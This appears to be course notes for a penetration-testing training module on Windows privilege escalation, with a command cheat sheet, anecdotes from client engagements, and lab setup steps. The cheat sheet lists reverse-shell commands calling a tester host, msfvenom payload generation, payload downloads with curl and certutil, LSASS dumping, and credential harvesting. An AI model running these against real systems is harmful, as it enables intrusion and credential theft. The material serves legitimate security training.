
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="24-windows-privilege-escalation">24. Windows Privilege Escalation</h1>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<h3 id="initial-enumeration">Initial Enumeration</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code></td>
<td>RDP to lab target</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>Get interface, IP address and DNS information</td>
</tr>
<tr>
<td><code>arp -a</code></td>
<td>Review ARP table</td>
</tr>
<tr>
<td><code>route print</code></td>
<td>Review routing table</td>
</tr>
<tr>
<td><code>Get-MpComputerStatus</code></td>
<td>Check Windows Defender status</td>
</tr>
<tr>
<td>`Get-AppLockerPolicy -Effective \</td>
<td>select -ExpandProperty RuleCollections`</td>
<td>List AppLocker rules</td>
</tr>
<tr>
<td>`Get-AppLockerPolicy -Local \</td>
<td>Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`</td>
<td>Test AppLocker policy</td>
</tr>
<tr>
<td><code>set</code></td>
<td>Display all environment variables</td>
</tr>
<tr>
<td><code>systeminfo</code></td>
<td>View detailed system configuration information</td>
</tr>
<tr>
<td><code>wmic qfe</code></td>
<td>Get patches and updates</td>
</tr>
<tr>
<td><code>wmic product get name</code></td>
<td>Get installed programs</td>
</tr>
<tr>
<td><code>tasklist /svc</code></td>
<td>Display running processes</td>
</tr>
<tr>
<td><code>query user</code></td>
<td>Get logged-in users</td>
</tr>
<tr>
<td><code>echo %USERNAME%</code></td>
<td>Get current user</td>
</tr>
<tr>
<td><code>whoami /priv</code></td>
<td>View current user privileges</td>
</tr>
<tr>
<td><code>whoami /groups</code></td>
<td>View current user group information</td>
</tr>
<tr>
<td><code>net user</code></td>
<td>Get all system users</td>
</tr>
<tr>
<td><code>net localgroup</code></td>
<td>Get all system groups</td>
</tr>
<tr>
<td><code>net localgroup administrators</code></td>
<td>View details about a group</td>
</tr>
<tr>
<td><code>net accounts</code></td>
<td>Get passsword policy</td>
</tr>
<tr>
<td><code>netstat -ano</code></td>
<td>Display active network connections</td>
</tr>
<tr>
<td><code>pipelist.exe /accepteula</code></td>
<td>List named pipes</td>
</tr>
<tr>
<td><code>gci \\.\pipe\</code></td>
<td>List named pipes with PowerShell</td>
</tr>
<tr>
<td><code>accesschk.exe /accepteula \\.\Pipe\lsass -v</code></td>
<td>Review permissions on a named pipe</td>
</tr>
</tbody>
</table>
<h3 id="handy-commands">Handy Commands</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth</code></td>
<td>Connect using mssqlclient.py</td>
</tr>
<tr>
<td><code>enable_xp_cmdshell</code></td>
<td>Enable xp_cmdshell with mssqlclient.py</td>
</tr>
<tr>
<td><code>xp_cmdshell whoami</code></td>
<td>Run OS commands with xp_cmdshell</td>
</tr>
<tr>
<td><code>c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe&quot; -t *</code></td>
<td>Escalate privileges with JuicyPotato</td>
</tr>
<tr>
<td><code>c:\tools\PrintSpoofer.exe -c &quot;c:\tools\nc.exe 10.10.14.3 8443 -e cmd&quot;</code></td>
<td>Escalating privileges with PrintSpoofer</td>
</tr>
<tr>
<td><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></td>
<td>Take memory dump with ProcDump</td>
</tr>
<tr>
<td><code>sekurlsa::minidump lsass.dmp</code> and <code>sekurlsa::logonpasswords</code></td>
<td>Use MimiKatz to extract credentials from LSASS memory dump</td>
</tr>
<tr>
<td><code>dir /q C:\backups\wwwroot\web.config</code></td>
<td>Checking ownership of a file</td>
</tr>
<tr>
<td><code>takeown /f C:\backups\wwwroot\web.config</code></td>
<td>Taking ownership of a file</td>
</tr>
<tr>
<td>`Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \</td>
<td>select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`</td>
<td>Confirming changed ownership of a file</td>
</tr>
<tr>
<td><code>icacls “C:\backups\wwwroot\web.config” /grant htb-student:F</code></td>
<td>Modifying a file ACL</td>
</tr>
<tr>
<td><code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code></td>
<td>Extract hashes with secretsdump.py</td>
</tr>
<tr>
<td><code>robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></td>
<td>Copy files with ROBOCOPY</td>
</tr>
<tr>
<td>`wevtutil qe Security /rd:true /f:text \</td>
<td>Select-String &quot;/user&quot;`</td>
<td>Searching security event logs</td>
</tr>
<tr>
<td>`wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \</td>
<td>findstr &quot;/user&quot;`</td>
<td>Passing credentials to wevtutil</td>
</tr>
<tr>
<td>`Get-WinEvent -LogName security \</td>
<td>where { $<em>.ID -eq 4688 -and $</em>.Properties[8].Value -like &#39;<em>/user</em>&#39; } \</td>
<td>Select-Object @{name=&#39;CommandLine&#39;;expression={ $_.Properties[8].Value }}`</td>
<td>Searching event logs with PowerShell</td>
</tr>
<tr>
<td><code>msfvenom -p windows/x64/exec cmd=&#39;net group &quot;domain admins&quot; netadm /add /domain&#39; -f dll -o adduser.dll</code></td>
<td>Generate malicious DLL</td>
</tr>
<tr>
<td><code>dnscmd.exe /config /serverlevelplugindll adduser.dll</code></td>
<td>Loading a custom DLL with dnscmd</td>
</tr>
<tr>
<td><code>wmic useraccount where name=&quot;netadm&quot; get sid</code></td>
<td>Finding a user&#39;s SID</td>
</tr>
<tr>
<td><code>sc.exe sdshow DNS</code></td>
<td>Checking permissions on DNS service</td>
</tr>
<tr>
<td><code>sc stop dns</code></td>
<td>Stopping a service</td>
</tr>
<tr>
<td><code>sc start dns</code></td>
<td>Starting a service</td>
</tr>
<tr>
<td><code>reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters</code></td>
<td>Querying a registry key</td>
</tr>
<tr>
<td><code>reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll</code></td>
<td>Deleting a registry key</td>
</tr>
<tr>
<td><code>sc query dns</code></td>
<td>Checking a service status</td>
</tr>
<tr>
<td><code>Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local</code></td>
<td>Disabling the global query block list</td>
</tr>
<tr>
<td><code>Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3</code></td>
<td>Adding a WPAD record</td>
</tr>
<tr>
<td><code>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code></td>
<td>Compile with cl.exe</td>
</tr>
<tr>
<td><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d &quot;\??\C:\Tools\Capcom.sys&quot;</code></td>
<td>Add reference to a driver (1)</td>
</tr>
<tr>
<td><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></td>
<td>Add reference to a driver (2)</td>
</tr>
<tr>
<td><code>.\DriverView.exe /stext drivers.txt</code> and `cat drivers.txt \</td>
<td>Select-String -pattern Capcom`</td>
<td>Check if driver is loaded</td>
</tr>
<tr>
<td><code>EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys</code></td>
<td>Using EopLoadDriver</td>
</tr>
<tr>
<td><code>c:\Tools\PsService.exe security AppReadiness</code></td>
<td>Checking service permissions with PsService</td>
</tr>
<tr>
<td><code>sc config AppReadiness binPath= &quot;cmd /c net localgroup Administrators server_adm /add&quot;</code></td>
<td>Modifying a service binary path</td>
</tr>
<tr>
<td><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA</code></td>
<td>Confirming UAC is enabled</td>
</tr>
<tr>
<td><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin</code></td>
<td>Checking UAC level</td>
</tr>
<tr>
<td><code>[environment]::OSVersion.Version</code></td>
<td>Checking Windows version</td>
</tr>
<tr>
<td><code>cmd /c echo %PATH%</code></td>
<td>Reviewing path variable</td>
</tr>
<tr>
<td><code>curl http://10.10.14.3:8080/srrstr.dll -O &quot;C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll&quot;</code></td>
<td>Downloading file with cURL in PowerShell</td>
</tr>
<tr>
<td><code>rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll</code></td>
<td>Executing custom dll with rundll32.exe</td>
</tr>
<tr>
<td><code>.\SharpUp.exe audit</code></td>
<td>Running SharpUp</td>
</tr>
<tr>
<td><code>icacls &quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</code></td>
<td>Checking service permissions with icacls</td>
</tr>
<tr>
<td><code>cmd /c copy /Y SecurityService.exe &quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</code></td>
<td>Replace a service binary</td>
</tr>
<tr>
<td>`wmic service get name,displayname,pathname,startmode \</td>
<td>findstr /i &quot;auto&quot; \</td>
<td>findstr /i /v &quot;c:\windows\&quot; \</td>
<td>findstr /i /v &quot;&quot;&quot;`</td>
<td>Searching for unquoted service paths</td>
</tr>
<tr>
<td><code>accesschk.exe /accepteula &quot;mrb3n&quot; -kvuqsw hklm\System\CurrentControlSet\services</code></td>
<td>Checking for weak service ACLs in the Registry</td>
</tr>
<tr>
<td><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name &quot;ImagePath&quot; -Value &quot;C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443&quot;</code></td>
<td>Changing ImagePath with PowerShell</td>
</tr>
<tr>
<td>`Get-CimInstance Win32_StartupCommand \</td>
<td>select Name, command, Location, User \</td>
<td>fl`</td>
<td>Check startup programs</td>
</tr>
<tr>
<td><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</code></td>
<td>Generating a malicious binary</td>
</tr>
<tr>
<td><code>get-process -Id 3324</code></td>
<td>Enumerating a process ID with PowerShell</td>
</tr>
<tr>
<td>`get-service \</td>
<td>? {$_.DisplayName -like &#39;Druva*&#39;}`</td>
<td>Enumerate a running service by name with PowerShell</td>
</tr>
</tbody>
</table>
<h3 id="credential-theft">Credential Theft</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>findstr /SIM /C:&quot;password&quot; *.txt *ini *.cfg *.config *.xml</code></td>
<td>Search for files with the phrase &quot;password&quot;</td>
</tr>
<tr>
<td>`gc &#39;C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt&#39; \</td>
<td>Select-String password`</td>
<td>Searching for passwords in Chrome dictionary files</td>
</tr>
<tr>
<td><code>(Get-PSReadLineOption).HistorySavePath</code></td>
<td>Confirm PowerShell history save path</td>
</tr>
<tr>
<td><code>gc (Get-PSReadLineOption).HistorySavePath</code></td>
<td>Reading PowerShell history file</td>
</tr>
<tr>
<td><code>$credential = Import-Clixml -Path &#39;C:\scripts\pass.xml&#39;</code></td>
<td>Decrypting PowerShell credentials</td>
</tr>
<tr>
<td><code>cd c:\Users\htb-student\Documents &amp; findstr /SI /M &quot;password&quot; *.xml *.ini *.txt</code></td>
<td>Searching file contents for a string</td>
</tr>
<tr>
<td><code>findstr /si password *.xml *.ini *.txt *.config</code></td>
<td>Searching file contents for a string</td>
</tr>
<tr>
<td><code>findstr /spin &quot;password&quot; *.*</code></td>
<td>Searching file contents for a string</td>
</tr>
<tr>
<td><code>select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password</code></td>
<td>Search file contents with PowerShell</td>
</tr>
<tr>
<td><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</code></td>
<td>Search for file extensions</td>
</tr>
<tr>
<td><code>where /R C:\ *.config</code></td>
<td>Search for file extensions</td>
</tr>
<tr>
<td><code>Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></td>
<td>Search for file extensions using PowerShell</td>
</tr>
<tr>
<td><code>cmdkey /list</code></td>
<td>List saved credentials</td>
</tr>
<tr>
<td><code>.\SharpChrome.exe logins /unprotect</code></td>
<td>Retrieve saved Chrome credentials</td>
</tr>
<tr>
<td><code>.\lazagne.exe -h</code></td>
<td>View LaZagne help menu</td>
</tr>
<tr>
<td><code>.\lazagne.exe all</code></td>
<td>Run all LaZagne modules</td>
</tr>
<tr>
<td><code>Invoke-SessionGopher -Target WINLPE-SRV01</code></td>
<td>Running SessionGopher</td>
</tr>
<tr>
<td><code>netsh wlan show profile</code></td>
<td>View saved wireless networks</td>
</tr>
<tr>
<td><code>netsh wlan show profile ilfreight_corp key=clear</code></td>
<td>Retrieve saved wireless passwords</td>
</tr>
</tbody>
</table>
<h3 id="other-commands">Other Commands</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat</code></td>
<td>Transfer file with certutil</td>
</tr>
<tr>
<td><code>certutil -encode file1 encodedfile</code></td>
<td>Encode file with certutil</td>
</tr>
<tr>
<td><code>certutil -decode encodedfile file2</code></td>
<td>Decode file with certutil</td>
</tr>
<tr>
<td><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code></td>
<td>Query for always install elevated registry key (1)</td>
</tr>
<tr>
<td><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></td>
<td>Query for always install elevated registry key (2)</td>
</tr>
<tr>
<td><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</code></td>
<td>Generate a malicious MSI package</td>
</tr>
<tr>
<td><code>msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart</code></td>
<td>Executing an MSI package from command line</td>
</tr>
<tr>
<td><code>schtasks /query /fo LIST /v</code></td>
<td>Enumerate scheduled tasks</td>
</tr>
<tr>
<td>`Get-ScheduledTask \</td>
<td>select TaskName,State`</td>
<td>Enumerate scheduled tasks with PowerShell</td>
</tr>
<tr>
<td><code>.\accesschk64.exe /accepteula -s -d C:\Scripts\</code></td>
<td>Check permissions on a directory</td>
</tr>
<tr>
<td><code>Get-LocalUser</code></td>
<td>Check local user description field</td>
</tr>
<tr>
<td>`Get-WmiObject -Class Win32_OperatingSystem \</td>
<td>select Description`</td>
<td>Enumerate computer description field</td>
</tr>
<tr>
<td><code>guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</code></td>
<td>Mount VMDK on Linux</td>
</tr>
<tr>
<td><code>guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1</code></td>
<td>Mount VHD/VHDX on Linux</td>
</tr>
<tr>
<td><code>sudo python2.7 windows-exploit-suggester.py --update</code></td>
<td>Update Windows Exploit Suggester database</td>
</tr>
<tr>
<td><code>python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</code></td>
<td>Running Windows Exploit Suggester</td>
</tr>
</tbody>
</table>
<h2 id="introduction-to-windows-privilege-escalation">Introduction to Windows Privilege Escalation</h2>
<hr>
<p>After gaining a foothold, elevating our privileges will provide more options for persistence and may reveal information stored locally that can further our access within the environment. The general goal of Windows privilege escalation is to further our access to a given system to a member of the <code>Local Administrators</code> group or the <code>NT AUTHORITY\SYSTEM</code> <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">LocalSystem</a> account. There may, however, be scenarios where escalating to another user on the system may be enough to reach our goal. Privilege escalation is typically a vital step during any engagement. We need to use the access obtained, or some data (such as credentials) found only once we have a session in an elevated context. In some cases, privilege escalation may be the ultimate goal of the assessment if our client hires us for a &quot;gold image&quot; or &quot;workstation breakout&quot; type assessment. Privilege escalation is often vital to continue through a network towards our ultimate objective, as well as for lateral movement.</p>
<p>That being said, we may need to escalate privileges for one of the following reasons:</p>
<table><thead><tr><th width="98"></th><th></th></tr></thead><tbody><tr><td>1.</td><td>When testing a client&#39;s <a href="https://www.techopedia.com/definition/29456/golden-image">gold image</a> Windows workstation and server build for flaws</td></tr><tr><td>2.</td><td>To escalate privileges locally to gain access to some local resource such as a database</td></tr><tr><td>3.</td><td>To gain <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">NT AUTHORITY\System</a> level access on a domain-joined machine to gain a foothold into the client&#39;s Active Directory environment</td></tr><tr><td>4.</td><td>To obtain credentials to move laterally or escalate privileges within the client&#39;s network</td></tr></tbody></table>

<p>There are many tools available to us as penetration testers to assist with privilege escalation. Still, it is also essential to understand how to perform privilege escalation checks and leverage flaws <code>manually</code> to the extent possible in a given scenario. We may run into situations where a client places us on a managed workstation with no internet access, heavily firewalled, and USB ports disabled, so we cannot load any tools/helper scripts. In this instance, it would be crucial to have a firm grasp of Windows privilege escalation checks using both PowerShell and Windows command-line.</p>
<p>Windows systems present a vast attack surface. Just some of the ways that we can escalate privileges are:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Abusing Windows group privileges</td>
<td>Abusing Windows user privileges</td>
</tr>
<tr>
<td>Bypassing User Account Control</td>
<td>Abusing weak service/file permissions</td>
</tr>
<tr>
<td>Leveraging unpatched kernel exploits</td>
<td>Credential theft</td>
</tr>
<tr>
<td>Traffic Capture</td>
<td>and more.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="scenario-1-overcoming-network-restrictions">Scenario 1 - Overcoming Network Restrictions</h3>
<p>I once was given the task to escalate privileges on a client-provided system with no internet access and blocked USB ports. Due to network access control in place, I could not plug my attack machine directly into the user network to assist me. During the assessment, I had already found a network flaw in which the printer VLAN was configured to allow outbound communication over ports 80, 443, and 445. I used manual enumeration methods to find a permissions-related flaw that allowed me to escalate privileges and perform a manual memory dump of the <code>LSASS</code> process. From here, I was able to mount an SMB share hosted on my attack machine on the printer VLAN and exfil the <code>LSASS</code> DMP file. With this file in hand, I used <code>Mimikatz</code> offline to retrieve the NTLM password hash for a domain admin, which I could crack offline and use to access a domain controller from the client-provided system.</p>
<hr>
<h3 id="scenario-2-pillaging-open-shares">Scenario 2 - Pillaging Open Shares</h3>
<p>During another assessment, I found myself in a pretty locked-down environment that was well monitored and without any obvious configuration flaws or vulnerable services/applications in use. I found a wide-open file share, allowing all users to list its contents and download files stored on it. This share was hosting backups of virtual machines in the environment. I was explicitly interested in virtual harddrive files (<code>.VMDK</code> and <code>.VHDX</code> files). I could access this share from a Windows VM, mount the <code>.VHDX</code> virtual hard drive as a local drive and browse the file system. From here, I retrieved the <code>SYSTEM</code>, <code>SAM</code>, and <code>SECURITY</code> registry hives, moved them to my Linux attack box, and extracted the local administrator password hash using the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a> tool. The organization happened to be using a gold image, and the local administrator hash could be used to gain admin access to nearly every Windows system via a pass-the-hash attack.</p>
<hr>
<h3 id="scenario-3-hunting-credentials-and-abusing-account-privileges">Scenario 3 - Hunting Credentials and Abusing Account Privileges</h3>
<p>In this final scenario, I was placed in a rather locked-down network with the goal of accessing critical database servers. The client provided me a laptop with a standard domain user account, and I could load tools onto it. I eventually ran the <a href="https://github.com/SnaffCon/Snaffler">Snaffler</a> tool to hunt file shares for sensitive information. I came across some <code>.sql</code> files containing low-privileged database credentials to a database on one of their database servers. I used an MSSQL client locally to connect to the database using the database credentials, enable the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> stored procedure and gain local command execution. Using this access as a service account, I confirmed that I had the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege</a>, which can be leveraged for local privilege escalation. I downloaded a custom compiled version of <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> to the host to assist with privilege escalation, and was able to add a local admin user. Adding a user was not ideal, but my attempts to obtain a beacon/reverse shell did not work. With this access, I was able to remote into the database host and gain complete control of one of the company&#39;s clients&#39; databases.</p>
<hr>
<h3 id="why-does-privilege-escalation-happen-">Why does Privilege Escalation Happen?</h3>
<p>There is no one reason why a company&#39;s host(s) may fall victim to privilege escalation, but several possible underlying causes exist. Some typical reasons that flaws are introduced and go unnoticed are personnel and budget. Many organizations simply do not have the personnel to properly keep up with patching, vulnerability management, periodic internal assessments (self-assessments), continuous monitoring, and larger, more resource-intensive initiatives. Such initiatives may include workstation and server upgrades, as well as file share audits (to lock down directories and secure/remove sensitive files such as scripts or configuration files containing credentials).</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>The scenarios above show how an understanding of Windows privilege escalation is crucial for a penetration tester. In the real world, we will rarely be attacking a single host and need to be able to think on our feet. We should be able to find creative ways to escalate privileges and ways to use this access to further our progress towards the goal of the assessment.</p>
<hr>
<h3 id="practical-examples">Practical Examples</h3>
<p>Throughout the module, we will cover examples with accompanying command output, most of which can be reproduced on the target VMs that can be spawned within the relevant sections. You will be provided RDP credentials to interact with the target VMs and complete the section exercises and skills assessments. You can connect from the Pwnbox or your own VM (after downloading a VPN key once a machine spawns) via RDP using <a href="https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface">FreeRDP</a>, <a href="https://remmina.org/">Remmina</a>, or the RDP client of your choice.</p>
<p><strong>Connecting via FreeRDP</strong></p>
<p>We can connect via command line using the command <code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code> and typing in the provided password when prompted. Most sections will provide credentials for the <code>htb-student</code> user, but some, depending on the material, will have you RDP with a different user, and alternate credentials will be provided.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student

[<span class="hljs-string">21:17:27:323</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_connect:freerdp_</span>set<span class="hljs-emphasis">_last_</span>error_ex resetting error state
[<span class="hljs-string">21:17:27:323</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpdr
[<span class="hljs-string">21:17:27:324</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpsnd
[<span class="hljs-string">21:17:27:324</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx cliprdr
[<span class="hljs-string">21:17:27:648</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.primitives</span>] - primitives autodetect, using optimized
[<span class="hljs-string">21:17:27:672</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_tcp_</span>is<span class="hljs-emphasis">_hostname_</span>resolvable:freerdp<span class="hljs-emphasis">_set_</span>last<span class="hljs-emphasis">_error_</span>ex resetting error state
[<span class="hljs-string">21:17:27:672</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_tcp_</span>connect:freerdp<span class="hljs-emphasis">_set_</span>last<span class="hljs-emphasis">_error_</span>ex resetting error state
[<span class="hljs-string">21:17:28:770</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - creating directory /home/user2/.config/freerdp
[<span class="hljs-string">21:17:28:770</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - creating directory [/home/user2/.config/freerdp/certs]
[<span class="hljs-string">21:17:28:771</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - created directory [/home/user2/.config/freerdp/server]
[<span class="hljs-string">21:17:28:794</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[<span class="hljs-string">21:17:28:794</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - CN = WINLPE-SKILLS1-SRV
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - The hostname used for this connection (10.129.43.36:3389) 
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - does not match the name given in the certificate:
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Common Name (CN):
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] -     WINLPE-SKILLS1-SRV
[<span class="hljs-string">21:17:28:795</span>] [<span class="hljs-string">28158:28159</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.36:3389 (RDP-Server):
<span class="hljs-code">    Common Name: WINLPE-SKILLS1-SRV</span>
<span class="hljs-code">    Subject:     CN = WINLPE-SKILLS1-SRV</span>
<span class="hljs-code">    Issuer:      CN = WINLPE-SKILLS1-SRV</span>
<span class="hljs-code">    Thumbprint:  9f:f0:dd:28:f5:6f:83:db:5e:8c:5a:e9:5f:50:a4:50:2d:b3:e7:a7:af:f4:4a:8a:1a:08:f3:cb:46:c3:c3:e8</span>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
Password:
</code></pre>
<p>Many of the module sections require tools such as open-source scripts, precompiled binaries, and exploit PoCs. Where applicable, these can be found in the <code>C:\Tools</code> directory on the target host. Even though most tools are provided, challenge yourself to upload files to the target (using techniques showcased in the <a href="https://academy.hackthebox.com/course/preview/file-transfers">File Transfers module</a>) and even compile some of the tools on your own using <a href="https://visualstudio.microsoft.com/downloads/">Visual Studio</a>.</p>
<p>Have fun, and don&#39;t forget to think outside the box!</p>
<p>-mrb3n</p>
<h2 id="useful-tools">Useful Tools</h2>
<hr>
<p>There are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Below is a list of useful binaries and scripts, many of which we will cover within the coming module sections.</p>
<table><thead><tr><th width="307">Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td><td>C# project for performing a wide variety of local privilege escalation checks</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></td><td>WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">here</a></td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></td><td>PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS">JAWS</a></td><td>PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0</td></tr><tr><td><a 